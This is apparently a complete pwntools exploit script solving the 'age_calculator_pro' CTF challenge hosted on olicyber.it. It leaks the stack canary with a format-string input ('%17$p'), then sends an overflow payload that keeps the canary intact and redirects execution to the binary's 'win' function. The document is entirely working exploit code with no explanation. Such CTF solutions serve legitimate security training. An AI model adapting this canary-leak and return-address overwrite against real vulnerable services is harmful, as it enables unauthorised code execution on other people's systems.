#!/usr/bin/env python3
from pwn import *

exe = ELF("./age_calculator_pro_patched")
context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("agecalculatorpro.challs.olicyber.it", 38103)
    else:
        r = gdb.debug(exe.path, gdbscript="""
            b *main
            continue      
        """)
    return r


def main():
    r = conn()
    r.recvuntil(b'?\n')
    r.sendline(b'%17$p')
    canary = p64(int(r.recvuntil(b',').decode()[:-1], 16))
    r.recvuntil(b'?\n')
    r.sendline(b'A' * (0x50 - 8) + canary + b'A' * 8 + p64(exe.sym['win']))
    r.interactive()


if __name__ == "__main__":
    main()
